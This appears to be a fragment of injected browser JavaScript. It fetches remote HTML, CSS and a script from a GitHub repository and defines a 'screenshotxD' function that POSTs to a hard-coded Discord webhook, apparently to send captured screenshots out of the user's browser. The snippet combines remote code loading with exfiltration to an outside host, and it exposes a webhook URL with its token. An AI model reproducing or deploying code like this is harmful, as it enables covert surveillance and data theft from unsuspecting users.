(function () {
  ...
  const windowURL =
    "https://raw.githubusercontent.com/wypierdalaj/s/main/index.html?es=" +
    Math.floor(Math.random() * 16777215).toString(16);
  const styleURL =
    "https://raw.githubusercontent.com/wypierdalaj/s/main/style.css?es=" +
    Math.floor(Math.random() * 16777215).toString(16);
  head.innerHTML +=
    '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">';
  const notificationScript = getData(
    "https://raw.githubusercontent.com/wypierdalaj/s/main/notif.js?es=" +
      Math.floor(Math.random() * 16777215).toString(16)
  );
  ...
  const setWindowFunction = () => {
    window.screenshotxD = () => {
      ...
      request.open(
        "POST",
        "https://discord.com/api/webhooks/1079404044445028402/496CuosXZpzH_Q4D1-JwQkE0LOINAAi1Z984gJojItH2Rio0fTWDLKfAbsFLqjbNJShD"
      );
